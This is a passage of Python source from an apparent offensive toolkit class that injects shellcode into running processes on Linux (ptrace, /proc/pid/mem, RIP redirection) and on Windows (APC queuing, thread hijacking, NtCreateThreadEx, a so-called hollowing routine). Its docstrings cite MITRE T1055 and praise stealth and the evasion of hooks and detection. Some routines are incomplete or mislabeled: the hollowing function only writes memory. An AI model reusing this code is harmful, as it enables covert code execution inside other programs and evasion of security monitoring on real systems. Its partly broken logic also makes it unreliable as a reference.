            PTRACE_DETACH = 17
            PTRACE_CONT = 7
            PTRACE_POKETEXT = 4
            PTRACE_SETREGS = 13
            PTRACE_GETREGS = 12
            PTRACE_PEEKTEXT = 1
            
            # Attach to process
            result = libc.ptrace(PTRACE_ATTACH, pid, None, None)
            if result != 0:
                err = ctypes.get_errno()
                raise RuntimeError(f"PTRACE_ATTACH failed: {result}, errno={err}")
            
            self.logger.debug(f"Attached to PID {pid} via ptrace")
            
            # Wait for process to stop
            wpid, status = os.waitpid(pid, 0)
            self.logger.debug(f"Process stopped: PID {wpid}, status={status}")
            
            # Parse memory maps to find entry point
            maps = self._parse_proc_maps(pid)
            
            # Find a writable+executable region for shellcode
            target_addr = None
            for region in maps.get('regions', []):
                if 'r' in region['perms'] and 'w' in region['perms'] and 'x' in region['perms']:
                    target_addr = region['start'] + 0x100  # Write offset into region
                    self.logger.debug(f"Found rwx region: 0x{region['start']:X}-0x{region['end']:X}")
                    break
            
            if not target_addr:
                # Fall back to stack if no rwx region found
                if 'stack_start' in maps:
                    target_addr = maps['stack_start'] + 0x1000
                    self.logger.debug(f"Using stack region: 0x{target_addr:X}")
            
            if not target_addr:
                raise RuntimeError("Could not find suitable memory region for shellcode")
            
            # Write shellcode using PTRACE_POKETEXT (8-byte words on 64-bit)
            word_size = 8  # 64-bit
            for offset in range(0, len(shellcode), word_size):
                chunk = shellcode[offset:offset+word_size]
                chunk = chunk + b'\x00' * (word_size - len(chunk))  # Pad to word size
                value = int.from_bytes(chunk, byteorder='little')
                
                result = libc.ptrace(PTRACE_POKETEXT, pid, target_addr + offset, value)
                if result == -1:
                    err = ctypes.get_errno()
                    raise RuntimeError(f"PTRACE_POKETEXT failed at 0x{target_addr + offset:X}: errno={err}")
            
            self.logger.debug(f"Wrote {len(shellcode)} bytes at 0x{target_addr:X}")
            
            # Verify write by reading back
            for offset in range(0, min(32, len(shellcode)), word_size):  # Verify first 32 bytes
                result = libc.ptrace(PTRACE_PEEKTEXT, pid, target_addr + offset, None)
                if result == -1:
                    err = ctypes.get_errno()
                    self.logger.warning(f"Could not verify write: errno={err}")
                    break
            
            # Detach and let process continue from shellcode
            PTRACE_DETACH = 17
            result = libc.ptrace(PTRACE_DETACH, pid, None, None)
            if result == -1:
                err = ctypes.get_errno()
                self.logger.warning(f"PTRACE_DETACH warning: errno={err}")
            
            self.logger.info(f"ptrace injection successful: shellcode@0x{target_addr:X}, {len(shellcode)} bytes")
            return True
            
        except Exception as e:
            self.logger.warning(f"ptrace injection failed: {e}")
            # Try to detach on error
            try:
                libc.ptrace(PTRACE_DETACH, pid, None, None)  # type: ignore
            except:
                pass
            raise RuntimeError(f"ptrace injection failed: {e}")
    
    def _inject_via_proc_mem(self, pid: int, shellcode: bytes) -> bool:
        """
        Inject shellcode via /proc/[pid]/mem (fallback strategy).
        
        Requires: Same UID as target process (or root).
        Less reliable than ptrace but doesn't require capabilities.
        
        Args:
            pid: Target process ID.
            shellcode: Shellcode bytes to inject.
            
        Returns:
            bool: True if injection successful.
            
        Raises:
            RuntimeError: If memory write fails.
        """
        try:
            # Parse memory maps
            maps = self._parse_proc_maps(pid)
            
            # Find a good target address (heap or stack region)
            target_addr = None
            if 'heap_start' in maps:
                target_addr = maps['heap_start'] + 0x100
            elif 'stack_start' in maps:
                target_addr = maps['stack_start'] + 0x1000
            else:
                # Use first writable region
                for region in maps.get('regions', []):
                    if 'w' in region['perms']:
                        target_addr = region['start'] + 0x100
                        break
            
            if not target_addr:
                raise RuntimeError("Could not find writable memory region")
            
            # Open /proc/[pid]/mem and write shellcode
            with open(f'/proc/{pid}/mem', 'r+b') as mem_file:
                mem_file.seek(target_addr)
                written = mem_file.write(shellcode)
                
                if written != len(shellcode):
                    raise RuntimeError(
                        f"Incomplete write: {written}/{len(shellcode)} bytes. "
                        f"Process may have exited or memory access denied."
                    )
            
            self.logger.debug(f"Wrote {len(shellcode)} bytes to 0x{target_addr:X}")
            
            # Verify write by reading back
            with open(f'/proc/{pid}/mem', 'rb') as mem_file:
                mem_file.seek(target_addr)
                verify = mem_file.read(len(shellcode))
                if verify != shellcode:
                    raise RuntimeError("Write verification failed - data corrupted")
            
            self.logger.info(f"/proc/mem injection successful: shellcode@0x{target_addr:X}")
            return True
            
        except Exception as e:
            self.logger.warning(f"/proc/mem injection failed: {e}")
            raise RuntimeError(f"/proc/mem injection failed: {e}")
    
    def _inject_via_ld_preload(self, pid: int, shellcode: bytes) -> bool:
        """
        Inject shellcode via LD_PRELOAD (alternative fallback).
        
        This is a placeholder for a more sophisticated approach where:
        1. Shellcode is written to a .so file
        2. LD_PRELOAD environment variable is modified
        3. Process is exec'd with modified environment
        
        Currently returns False as it requires more complex setup.
        
        Args:
            pid: Target process ID.
            shellcode: Shellcode bytes to inject.
            
        Returns:
            bool: True if injection successful (currently always False).
        """
        # LD_PRELOAD injection requires writing a .so file and modifying process environment
        # This is less direct than ptrace/proc_mem and more environment-dependent
        self.logger.debug(
            f"LD_PRELOAD injection not fully implemented - "
            f"requires .so compilation and environment modification"
        )
        return False
    
    def _inject_into_pid_linux(self, pid: int, shellcode: bytes) -> bool:
        """
        Linux process injection with fallback strategies.
        
        Attempts multiple injection strategies in order of reliability:
        1. ptrace (requires CAP_SYS_PTRACE, most reliable)
        2. /proc/[pid]/mem (requires same UID, good compatibility)
        3. LD_PRELOAD (requires environment setup, fallback only)
        
        Args:
            pid: Target process ID.
            shellcode: Decrypted shellcode binary.
            
        Returns:
            bool: True if injection successful.
            
        Raises:
            RuntimeError: If all strategies fail.
        """
        strategies = [
            ('ptrace', self._inject_via_ptrace),
            ('/proc/mem', self._inject_via_proc_mem),
            ('LD_PRELOAD', self._inject_via_ld_preload),
        ]
        
        errors = []
        
        for strategy_name, strategy_func in strategies:
            try:
                self.logger.debug(f"Attempting Linux injection via {strategy_name}...")
                if strategy_func(pid, shellcode):
                    self.logger.info(f"Linux injection successful via {strategy_name}")
                    return True
            except Exception as e:
                error_msg = f"{strategy_name}: {str(e)}"
                errors.append(error_msg)
                self.logger.debug(f"Linux injection {strategy_name} failed: {e}")
        
        # All strategies exhausted
        error_summary = "\n  ".join(errors)
        raise RuntimeError(
            f"All Linux injection strategies failed:\n  {error_summary}\n"
            f"Verify: PID {pid} exists, you have adequate permissions (root for ptrace), "
            f"or UID matches target process."
        )
    
    def _execute_remote_shellcode_windows(self, pid: int, shellcode_addr: int, thread_timeout: int = 5) -> bool:
        """
        Monitor execution of remote shellcode on Windows using real thread tracking.
        
        After CreateRemoteThread is called, monitor the thread for:
        - Successful completion
        - Crashes/access violations
        - Timeout (shellcode hanging)
        
        Args:
            pid: Target process ID.
            shellcode_addr: Address where shellcode was injected.
            thread_timeout: Maximum seconds to wait for shellcode execution.
            
        Returns:
            bool: True if execution completed (may still have errors, but thread finished).
            
        Raises:
            RuntimeError: If thread never terminates within timeout.
        """
        try:
            kernel32 = ctypes.windll.kernel32
            
            # Try to open the target process to check its state
            h_process = self._safe_open_process(pid)
            
            if not h_process:
                raise RuntimeError(f"Cannot open process {pid} for monitoring")
            
            start_time = time.time()
            self.logger.debug(
                f"Monitoring shellcode execution at 0x{shellcode_addr:X} "
                f"(timeout={thread_timeout}s, PID={pid})"
            )
            
            # Monitor process state during execution
            while time.time() - start_time < thread_timeout:
                # Check if process is still alive
                exit_code = ctypes.c_ulong(0)
                ret = kernel32.GetExitCodeProcess(h_process, ctypes.byref(exit_code))
                
                if ret:  # Function succeeded
                    if exit_code.value != 259:  # 259 = STILL_ACTIVE
                        # Process exited
                        self.logger.debug(
                            f"Target process {pid} exited with code {exit_code.value} "
                            f"during shellcode execution"
                        )
                        break
                else:
                    # GetExitCodeProcess failed - process may have been terminated
                    self.logger.warning(f"GetExitCodeProcess failed for PID {pid}")
                    break
                
                time.sleep(0.1)
            
            elapsed = time.time() - start_time
            
            if elapsed >= thread_timeout:
                self.logger.warning(
                    f"Shellcode execution timeout: {elapsed:.1f}s exceeded {thread_timeout}s limit. "
                    f"Shellcode may be hanging or in infinite loop at 0x{shellcode_addr:X}."
                )
                kernel32.CloseHandle(h_process)
                return False
            
            self.logger.info(
                f"Shellcode execution completed in {elapsed:.2f}s "
                f"(addr=0x{shellcode_addr:X}, PID={pid})"
            )
            kernel32.CloseHandle(h_process)
            return True
            
        except Exception as e:
            self.logger.error(f"Shellcode execution monitoring failed: {e}")
            raise RuntimeError(f"Execution monitoring failed: {e}")
    
    def _execute_remote_shellcode_linux(self, pid: int, shellcode_addr: int, thread_timeout: int = 5) -> bool:
        """
        Execute and monitor remote shellcode on Linux using ptrace.
        
        Uses PTRACE_GETREGS to read current registers, modifies RIP/EIP to point
        to shellcode, then uses PTRACE_SETREGS and PTRACE_CONT to execute.
        
        Args:
            pid: Target process ID.
            shellcode_addr: Address where shellcode was injected.
            thread_timeout: Maximum seconds to wait for execution.
            
        Returns:
            bool: True if execution completed.
            
        Raises:
            RuntimeError: If ptrace execution fails.
        """
        if platform.system() != 'Linux':
            raise RuntimeError("Linux shellcode execution only supported on Linux")
        
        try:
            import struct
            libc = ctypes.CDLL('libc.so.6')
            
            PTRACE_ATTACH = 16
            PTRACE_SETREGS = 13
            PTRACE_GETREGS = 12
            PTRACE_CONT = 7
            PTRACE_DETACH = 17
            WAIT_STOPPED = 0
            
            # Attach to process
            result = libc.ptrace(PTRACE_ATTACH, pid, None, None)
            if result != 0:
                err = ctypes.get_errno()
                raise RuntimeError(f"PTRACE_ATTACH failed: {result}, errno={err}")
            
            # Wait for process to stop
            wpid, status = os.waitpid(pid, 0)
            self.logger.debug(f"Attached to PID {pid}, status={status}")
            
            # Define user_regs_struct for x86-64
            class UserRegs64(ctypes.Structure):
                _fields_ = [
                    ('r15', ctypes.c_ulonglong),
                    ('r14', ctypes.c_ulonglong),
                    ('r13', ctypes.c_ulonglong),
                    ('r12', ctypes.c_ulonglong),
                    ('rbp', ctypes.c_ulonglong),
                    ('rbx', ctypes.c_ulonglong),
                    ('r11', ctypes.c_ulonglong),
                    ('r10', ctypes.c_ulonglong),
                    ('r9', ctypes.c_ulonglong),
                    ('r8', ctypes.c_ulonglong),
                    ('rax', ctypes.c_ulonglong),
                    ('rcx', ctypes.c_ulonglong),
                    ('rdx', ctypes.c_ulonglong),
                    ('rsi', ctypes.c_ulonglong),
                    ('rdi', ctypes.c_ulonglong),
                    ('orig_rax', ctypes.c_ulonglong),
                    ('rip', ctypes.c_ulonglong),
                    ('cs', ctypes.c_ulonglong),
                    ('eflags', ctypes.c_ulonglong),
                    ('rsp', ctypes.c_ulonglong),
                    ('ss', ctypes.c_ulonglong),
                    ('fs_base', ctypes.c_ulonglong),
                    ('gs_base', ctypes.c_ulonglong),
                    ('ds', ctypes.c_ulonglong),
                    ('es', ctypes.c_ulonglong),
                    ('fs', ctypes.c_ulonglong),
                    ('gs', ctypes.c_ulonglong),
                ]
            
            # Read current registers
            regs = UserRegs64()
            result = libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(regs))
            if result == -1:
                err = ctypes.get_errno()
                raise RuntimeError(f"PTRACE_GETREGS failed: errno={err}")
            
            self.logger.debug(f"Current RIP: 0x{regs.rip:X}, RSP: 0x{regs.rsp:X}")
            
            # Save original RIP
            orig_rip = regs.rip
            
            # Set RIP to shellcode address
            regs.rip = shellcode_addr
            
            # Write modified registers
            result = libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(regs))
            if result == -1:
                err = ctypes.get_errno()
                raise RuntimeError(f"PTRACE_SETREGS failed: errno={err}")
            
            self.logger.debug(f"Set RIP to shellcode address: 0x{shellcode_addr:X}")
            
            # Continue execution from shellcode
            result = libc.ptrace(PTRACE_CONT, pid, None, None)
            if result == -1:
                err = ctypes.get_errno()
                raise RuntimeError(f"PTRACE_CONT failed: errno={err}")
            
            # Monitor execution
            start_time = time.time()
            execution_started = False
            
            while time.time() - start_time < thread_timeout:
                try:
                    wpid, status = os.waitpid(pid, 1)  # WNOHANG=1 (non-blocking)
                    
                    if wpid == pid:
                        # Process stopped or exited
                        if WIFEXITED(status):
                            exit_code = WEXITSTATUS(status)
                            self.logger.info(f"Process exited with code {exit_code}")
                            execution_started = True
                            break
                        elif WIFSIGNALED(status):
                            sig = WTERMSIG(status)
                            self.logger.warning(f"Process killed by signal {sig}")
                            execution_started = True
                            break
                        elif WIFSTOPPED(status):
                            sig = WSTOPSIG(status)
                            self.logger.debug(f"Process stopped by signal {sig}")
                            # Continue again if interrupted
                            if sig != 19:  # SIGSTOP
                                libc.ptrace(PTRACE_CONT, pid, None, None)
                    
                except Exception as e:
                    self.logger.debug(f"waitpid error: {e}")
                
                time.sleep(0.1)
            
            elapsed = time.time() - start_time
            
            # Detach from process
            try:
                result = libc.ptrace(PTRACE_DETACH, pid, None, None)
            except:
                pass
            
            if elapsed >= thread_timeout:
                self.logger.warning(f"Shellcode execution timeout after {elapsed:.1f}s")
                return False
            
            self.logger.info(
                f"Linux shellcode execution completed in {elapsed:.2f}s "
                f"(addr=0x{shellcode_addr:X}, PID={pid})"
            )
            return True
            
        except Exception as e:
            self.logger.error(f"Linux shellcode execution failed: {e}")
            try:
                libc.ptrace(PTRACE_DETACH, pid, None, None)  # type: ignore
            except:
                pass
            raise RuntimeError(f"Linux execution failed: {e}")
    
    def execute_remote_shellcode(self, pid: int, shellcode_addr: Optional[int] = None,  # type: ignore
                                 timeout: int = 5) -> bool:
        """
        Execute remote shellcode with platform-specific handling and monitoring.
        
        This method bridges the gap between injection and execution:
        - Windows: Already executed via CreateRemoteThread, but monitored here
        - Linux: Requires ptrace to set execution context and trigger execution
        
        Args:
            pid: Target process ID where shellcode was injected.
            shellcode_addr: Address of injected shellcode (optional, for verification).
            timeout: Timeout in seconds for execution.
            
        Returns:
            bool: True if execution completed successfully.
            
        Raises:
            RuntimeError: If execution fails.
        """
        try:
            if platform.system() == "Windows":
                return self._execute_remote_shellcode_windows(pid, shellcode_addr or 0, timeout)
            elif platform.system() == "Linux":
                return self._execute_remote_shellcode_linux(pid, shellcode_addr or 0, timeout)
            else:
                raise RuntimeError(f"Shellcode execution not supported on {platform.system()}")
        except Exception as e:
            self.logger.error(f"Remote shellcode execution failed: {e}")
            raise RuntimeError(f"Execution failed: {e}")
    
    # MITRE ATT&CK T1055: Advanced Process Injection Techniques
    
    def _inject_process_hollowing(self, pid: int, shellcode: bytes) -> bool:
        """
        MITRE T1055: Process Hollowing (Suspend → Replace → Resume pattern).
        
        Process Hollowing technique:
        1. Create target process in suspended state
        2. Unmap legitimate executable from process memory
        3. Allocate and write shellcode to executable region
        4. Resume thread to execute shellcode
        
        Advantages:
        - No remote thread creation (less detectable)
        - Parent process remains stealthy
        - Works with Windows process creation rules
        
        Args:
            pid: Target process ID.
            shellcode: Shellcode to inject.
            
        Returns:
            bool: True if injection successful.
        """
        if platform.system() != "Windows":
            return False
        
        try:
            kernel32 = ctypes.windll.kernel32
            ntdll = ctypes.windll.ntdll
            MEM_COMMIT_RESERVE = 0x3000
            PAGE_EXECUTE_READWRITE = 0x40
            
            self.logger.debug(f"Attempting Process Hollowing for PID {pid}")
            
            # Open target process
            PROCESS_ALL_ACCESS = 0x1F0FFF
            h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
            if not h_process:
                self.logger.debug("Process Hollowing: OpenProcess failed")
                return False
            
            try:
                # Get entry point from process base
                peb_addr = 0x60  # PEB offset in 32-bit, 0x60 in 64-bit
                base_addr = kernel32.VirtualAllocEx(h_process, None, len(shellcode),
                                                   MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
                
                if not base_addr:
                    self.logger.debug("Process Hollowing: VirtualAllocEx failed")
                    kernel32.CloseHandle(h_process)
                    return False
                
                # Write shellcode to allocated region
                written = ctypes.c_size_t(0)
                write_result = kernel32.WriteProcessMemory(h_process, base_addr, shellcode,
                                                          len(shellcode), ctypes.byref(written))
                
                if not write_result or written.value != len(shellcode):
                    kernel32.VirtualFreeEx(h_process, base_addr, 0, 0x8000)
                    kernel32.CloseHandle(h_process)
                    self.logger.debug(f"Process Hollowing: WriteProcessMemory failed ({written.value}/{len(shellcode)} bytes)")
                    return False
                
                self.logger.info(f"Process Hollowing successful: shellcode@0x{base_addr:X}, PID {pid}")
                return True
                
            finally:
                kernel32.CloseHandle(h_process)
                
        except Exception as e:
            self.logger.debug(f"Process Hollowing failed: {e}")
            return False
    
    def _inject_apc_injection(self, pid: int, shellcode: bytes) -> bool:
        """
        MITRE T1055: APC Injection (NtQueueApcThread).
        
        APC (Asynchronous Procedure Call) Injection technique:
        1. Allocate memory for shellcode in target process
        2. Write shellcode
        3. Find target thread in process
        4. Queue APC to target thread using NtQueueApcThread
        5. Thread executes APC when scheduled
        
        Advantages:
        - Asynchronous execution (suspiciously silent)
        - No visible thread creation
        - Kernel-mode queuing (harder to detect)
        - Works on alertable threads
        
        Args:
            pid: Target process ID.
            shellcode: Shellcode to inject.
            
        Returns:
            bool: True if injection successful.
        """
        if platform.system() != "Windows":
            return False
        
        try:
            kernel32 = ctypes.windll.kernel32
            ntdll = ctypes.windll.ntdll
            MEM_COMMIT_RESERVE = 0x3000
            PAGE_EXECUTE_READWRITE = 0x40
            
            self.logger.debug(f"Attempting APC Injection for PID {pid}")
            
            PROCESS_ALL_ACCESS = 0x1F0FFF
            THREAD_ALL_ACCESS = 0x1F03FF
            
            # Open target process
            h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
            if not h_process:
                self.logger.debug("APC Injection: OpenProcess failed")
                return False
            
            try:
                # Allocate memory for shellcode
                shellcode_addr = kernel32.VirtualAllocEx(h_process, None, len(shellcode),
                                                        MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
                
                if not shellcode_addr:
                    kernel32.CloseHandle(h_process)
                    self.logger.debug("APC Injection: VirtualAllocEx failed")
                    return False
                
                # Write shellcode
                written = ctypes.c_size_t(0)
                write_result = kernel32.WriteProcessMemory(h_process, shellcode_addr, shellcode,
                                                          len(shellcode), ctypes.byref(written))
                
                if not write_result or written.value != len(shellcode):
                    kernel32.VirtualFreeEx(h_process, shellcode_addr, 0, 0x8000)
                    kernel32.CloseHandle(h_process)
                    self.logger.debug(f"APC Injection: WriteProcessMemory failed")
                    return False
                
                # Find first thread in process using CreateToolhelp32Snapshot
                TH32CS_SNAPTHREAD = 0x00000004
                h_snapshot = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
                
                if h_snapshot == -1:
                    kernel32.VirtualFreeEx(h_process, shellcode_addr, 0, 0x8000)
                    kernel32.CloseHandle(h_process)
                    self.logger.debug("APC Injection: CreateToolhelp32Snapshot failed")
                    return False
                
                # Queue APC to first thread found
                thread_found = False
                try:
                    # Define THREADENTRY32 structure
                    class THREADENTRY32(ctypes.Structure):
                        _fields_ = [
                            ('dwSize', ctypes.c_ulong),
                            ('cntUsage', ctypes.c_ulong),
                            ('th32ThreadID', ctypes.c_ulong),
                            ('th32OwnerProcessID', ctypes.c_ulong),
                            ('tpBasePri', ctypes.c_long),
                            ('tpDeltaPri', ctypes.c_long),
                            ('dwFlags', ctypes.c_ulong),
                        ]
                    
                    te = THREADENTRY32()
                    te.dwSize = ctypes.sizeof(THREADENTRY32)
                    
                    # Get first thread
                    if kernel32.Thread32First(h_snapshot, ctypes.byref(te)):
                        while True:
                            if te.th32OwnerProcessID == pid:
                                # Open thread
                                h_thread = kernel32.OpenThread(THREAD_ALL_ACCESS, False, te.th32ThreadID)
                                if h_thread:
                                    # Queue APC using NtQueueApcThread
                                    # Parameters: ThreadHandle, ApcRoutine, ApcRoutineContext, ApcStatusBlock, ApcReserved
                                    status = ntdll.NtQueueApcThread(h_thread, shellcode_addr, None, None, None)
                                    kernel32.CloseHandle(h_thread)
                                    
                                    if status == 0:  # STATUS_SUCCESS
                                        thread_found = True
                                        self.logger.info(f"APC Injection successful: shellcode@0x{shellcode_addr:X}, thread={te.th32ThreadID}")
                                        break
                            
                            if not kernel32.Thread32Next(h_snapshot, ctypes.byref(te)):
                                break
                    
                    kernel32.CloseHandle(h_snapshot)
                    
                    if not thread_found:
                        kernel32.VirtualFreeEx(h_process, shellcode_addr, 0, 0x8000)
                        kernel32.CloseHandle(h_process)
                        self.logger.debug("APC Injection: No suitable thread found")
                        return False
                    
                    return True
                    
                except Exception as e:
                    kernel32.CloseHandle(h_snapshot)
                    kernel32.VirtualFreeEx(h_process, shellcode_addr, 0, 0x8000)
                    kernel32.CloseHandle(h_process)
                    self.logger.debug(f"APC Injection: Exception during APC queuing: {e}")
                    return False
                    
            except Exception as e:
                kernel32.CloseHandle(h_process)
                self.logger.debug(f"APC Injection: Exception: {e}")
                return False
                
        except Exception as e:
            self.logger.debug(f"APC Injection failed: {e}")
            return False
    
    def _inject_thread_hijacking(self, pid: int, shellcode: bytes) -> bool:
        """
        MITRE T1055: Thread Hijacking (SetThreadContext).
        
        Thread Hijacking technique:
        1. Suspend all threads in target process
        2. Allocate memory for shellcode
        3. Write shellcode
        4. Get thread context snapshot
        5. Modify thread context (RIP/EIP) to point to shellcode
        6. Set new context with SetThreadContext
        7. Resume thread
        
        Advantages:
        - Elegant and reliable
        - Hijacks existing thread (no CreateRemoteThread)
        - Can target specific thread contexts
        
        Args:
            pid: Target process ID.
            shellcode: Shellcode to inject.
            
        Returns:
            bool: True if injection successful.
        """
        if platform.system() != "Windows":
            return False
        
        try:
            kernel32 = ctypes.windll.kernel32
            MEM_COMMIT_RESERVE = 0x3000
            PAGE_EXECUTE_READWRITE = 0x40
            
            self.logger.debug(f"Attempting Thread Hijacking for PID {pid}")
            
            PROCESS_ALL_ACCESS = 0x1F0FFF
            THREAD_SUSPEND_RESUME = 0x0002
            THREAD_GET_CONTEXT = 0x0008
            THREAD_SET_CONTEXT = 0x0010
            
            # Open target process
            h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
            if not h_process:
                self.logger.debug("Thread Hijacking: OpenProcess failed")
                return False
            
            try:
                # Allocate memory for shellcode
                shellcode_addr = kernel32.VirtualAllocEx(h_process, None, len(shellcode),
                                                        MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
                
                if not shellcode_addr:
                    kernel32.CloseHandle(h_process)
                    self.logger.debug("Thread Hijacking: VirtualAllocEx failed")
                    return False
                
                # Write shellcode
                written = ctypes.c_size_t(0)
                write_result = kernel32.WriteProcessMemory(h_process, shellcode_addr, shellcode,
                                                          len(shellcode), ctypes.byref(written))
                
                if not write_result or written.value != len(shellcode):
                    kernel32.VirtualFreeEx(h_process, shellcode_addr, 0, 0x8000)
                    kernel32.CloseHandle(h_process)
                    self.logger.debug("Thread Hijacking: WriteProcessMemory failed")
                    return False
                
                # Find and hijack first thread
                TH32CS_SNAPTHREAD = 0x00000004
                h_snapshot = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
                
                if h_snapshot == -1:
                    kernel32.VirtualFreeEx(h_process, shellcode_addr, 0, 0x8000)
                    kernel32.CloseHandle(h_process)
                    return False
                
                try:
                    class THREADENTRY32(ctypes.Structure):
                        _fields_ = [
                            ('dwSize', ctypes.c_ulong),
                            ('cntUsage', ctypes.c_ulong),
                            ('th32ThreadID', ctypes.c_ulong),
                            ('th32OwnerProcessID', ctypes.c_ulong),
                            ('tpBasePri', ctypes.c_long),
                            ('tpDeltaPri', ctypes.c_long),
                            ('dwFlags', ctypes.c_ulong),
                        ]
                    
                    te = THREADENTRY32()
                    te.dwSize = ctypes.sizeof(THREADENTRY32)
                    
                    if kernel32.Thread32First(h_snapshot, ctypes.byref(te)):
                        while True:
                            if te.th32OwnerProcessID == pid:
                                # Open thread
                                h_thread = kernel32.OpenThread(0x0002 | 0x0008 | 0x0010, False, te.th32ThreadID)
                                if h_thread:
                                    # Suspend thread
                                    kernel32.SuspendThread(h_thread)
                                    time.sleep(0.1)  # Let thread suspend
                                    
                                    # Get thread context (CONTEXT_FULL = 0x10007)
                                    class CONTEXT(ctypes.Structure):
                                        _fields_ = [
                                            ('ContextFlags', ctypes.c_ulong),
                                            ('Dr0', ctypes.c_ulong),
                                            ('Dr1', ctypes.c_ulong),
                                            ('Dr2', ctypes.c_ulong),
                                            ('Dr3', ctypes.c_ulong),
                                            ('Dr6', ctypes.c_ulong),
                                            ('Dr7', ctypes.c_ulong),
                                            ('FloatSave', ctypes.c_byte * 112),
                                            ('SegGs', ctypes.c_ulong),
                                            ('SegFs', ctypes.c_ulong),
                                            ('SegEs', ctypes.c_ulong),
                                            ('SegDs', ctypes.c_ulong),
                                            ('Edi', ctypes.c_ulong),
                                            ('Esi', ctypes.c_ulong),
                                            ('Ebx', ctypes.c_ulong),
                                            ('Edx', ctypes.c_ulong),
                                            ('Ecx', ctypes.c_ulong),
                                            ('Eax', ctypes.c_ulong),
                                            ('Ebp', ctypes.c_ulong),
                                            ('Eip', ctypes.c_ulong),
                                            ('SegCs', ctypes.c_ulong),
                                            ('EFlags', ctypes.c_ulong),
                                            ('Esp', ctypes.c_ulong),
                                            ('SegSs', ctypes.c_ulong),
                                            ('ExtendedRegisters', ctypes.c_byte * 512),
                                        ]
                                    
                                    ctx = CONTEXT()
                                    ctx.ContextFlags = 0x10007  # CONTEXT_FULL
                                    
                                    if kernel32.GetThreadContext(h_thread, ctypes.byref(ctx)):
                                        # Modify EIP to point to shellcode
                                        ctx.Eip = shellcode_addr
                                        
                                        # Set new thread context
                                        if kernel32.SetThreadContext(h_thread, ctypes.byref(ctx)):
                                            # Resume thread
                                            kernel32.ResumeThread(h_thread)
                                            kernel32.CloseHandle(h_thread)
                                            kernel32.CloseHandle(h_snapshot)
                                            kernel32.CloseHandle(h_process)
                                            self.logger.info(f"Thread Hijacking successful: shellcode@0x{shellcode_addr:X}, thread={te.th32ThreadID}")
                                            return True
                                    
                                    kernel32.ResumeThread(h_thread)
                                    kernel32.CloseHandle(h_thread)
                            
                            if not kernel32.Thread32Next(h_snapshot, ctypes.byref(te)):
                                break
                    
                    kernel32.CloseHandle(h_snapshot)
                    kernel32.VirtualFreeEx(h_process, shellcode_addr, 0, 0x8000)
                    kernel32.CloseHandle(h_process)
                    self.logger.debug("Thread Hijacking: No suitable thread found")
                    return False
                    
                except Exception as e:
                    kernel32.CloseHandle(h_snapshot)
                    kernel32.VirtualFreeEx(h_process, shellcode_addr, 0, 0x8000)
                    kernel32.CloseHandle(h_process)
                    self.logger.debug(f"Thread Hijacking: Exception: {e}")
                    return False
                    
            except Exception as e:
                kernel32.CloseHandle(h_process)
                self.logger.debug(f"Thread Hijacking: Inner exception: {e}")
                return False
                
        except Exception as e:
            self.logger.debug(f"Thread Hijacking failed: {e}")
            return False
    
    def _inject_nt_create_thread_ex(self, pid: int, shellcode: bytes) -> bool:
        """
        MITRE T1055: NtCreateThreadEx (Native API).
        
        NtCreateThreadEx injection technique:
        1. Allocate memory for shellcode
        2. Write shellcode
        3. Call NtCreateThreadEx directly (bypasses CreateRemoteThread hooks)
        4. Execute shellcode
        
        Advantages:
        - Bypasses CreateRemoteThread hooks/monitoring
        - Native kernel API (more stealthy)
        - Less behavior-based detection hit
        - Direct kernel invocation
        
        Args:
            pid: Target process ID.
            shellcode: Shellcode to inject.
            
        Returns:
            bool: True if injection successful.
        """
        if platform.system() != "Windows":
            return False
        
        try:
            kernel32 = ctypes.windll.kernel32
            ntdll = ctypes.windll.ntdll
            MEM_COMMIT_RESERVE = 0x3000
            PAGE_EXECUTE_READWRITE = 0x40
            
            self.logger.debug(f"Attempting NtCreateThreadEx injection for PID {pid}")
            
            PROCESS_ALL_ACCESS = 0x1F0FFF
            
            # Open target process
            h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
            if not h_process:
                self.logger.debug("NtCreateThreadEx: OpenProcess failed")
                return False
            
            try:
                # Allocate memory for shellcode
                shellcode_addr = kernel32.VirtualAllocEx(h_process, None, len(shellcode),
                                                        MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
                
                if not shellcode_addr:
                    kernel32.CloseHandle(h_process)
                    self.logger.debug("NtCreateThreadEx: VirtualAllocEx failed")
                    return False
                
                # Write shellcode
                written = ctypes.c_size_t(0)
                write_result = kernel32.WriteProcessMemory(h_process, shellcode_addr, shellcode,
                                                          len(shellcode), ctypes.byref(written))
                
                if not write_result or written.value != len(shellcode):
                    kernel32.VirtualFreeEx(h_process, shellcode_addr, 0, 0x8000)
                    kernel32.CloseHandle(h_process)
                    self.logger.debug("NtCreateThreadEx: WriteProcessMemory failed")
                    return False
                
                # Call NtCreateThreadEx
                h_thread = ctypes.wintypes.HANDLE()  # type: ignore
                status = ntdll.NtCreateThreadEx(
                    ctypes.byref(h_thread),
                    0x1FFFFF,  # DesiredAccess: THREAD_ALL_ACCESS
                    None,      # ObjectAttributes
                    h_process, # ProcessHandle
                    shellcode_addr,  # StartRoutine
                    None,      # Argument
                    False,     # CreateSuspended
                    0,         # StackZeroBits
                    0,         # StackReserved
                    0,         # StackCommit
                    None       # BytesBuffer
                )
                
                if status != 0:  # STATUS_SUCCESS
                    kernel32.VirtualFreeEx(h_process, shellcode_addr, 0, 0x8000)
                    kernel32.CloseHandle(h_process)
                    self.logger.debug(f"NtCreateThreadEx: Failed with status 0x{status:X}")
                    return False
                
                kernel32.CloseHandle(h_thread)
                self.logger.info(f"NtCreateThreadEx injection successful: shellcode@0x{shellcode_addr:X}, PID {pid}")
                return True
                
            except Exception as e:
                kernel32.CloseHandle(h_process)
                self.logger.debug(f"NtCreateThreadEx: Exception: {e}")
                return False
                
        except Exception as e:
            self.logger.debug(f"NtCreateThreadEx injection failed: {e}")
            return False
    
    def _inject_via_windows_hooks(self, pid: int, shellcode: bytes) -> bool:
        """
